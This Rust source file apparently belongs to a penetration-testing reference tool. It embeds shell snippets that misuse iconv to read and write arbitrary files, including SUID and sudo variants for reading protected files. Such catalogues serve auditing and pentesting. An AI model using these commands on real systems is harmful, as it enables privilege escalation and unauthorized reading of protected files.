pub static BIN_NAME: &'static str = "iconv";
pub static BIN_DESC: &'static str = "The `8859_1` encoding is used as it accepts any single-byte sequence, thus it allows to read/write arbitrary files. Other encoding combinations may corrupt the result.";
pub static FW_CODE: &'static str = r#"
    
    LFILE=file_to_write
    echo "DATA" | iconv -f 8859_1 -t 8859_1 -o "$LFILE"
"#;
pub static FR_CODE: &'static str = r#"
    
    LFILE=file_to_read
    iconv -f 8859_1 -t 8859_1 "$LFILE"
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which iconv) .

    LFILE=file_to_read
    ./iconv -f 8859_1 -t 8859_1 "$LFILE"
"#;
pub static SUDO_CODE: &'static str = r#"
    
    LFILE=file_to_read
    ./iconv -f 8859_1 -t 8859_1 "$LFILE"
"#;
use crate::code::{Code, Tag};
pub static FW: Code<'static> = Code { 
	title: "FW_CODE",
	code: FW_CODE,
	tag: Tag::FW,
};
pub static FR: Code<'static> = Code { 
	title: "FR_CODE",
	code: FR_CODE,
	tag: Tag::FR,
};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
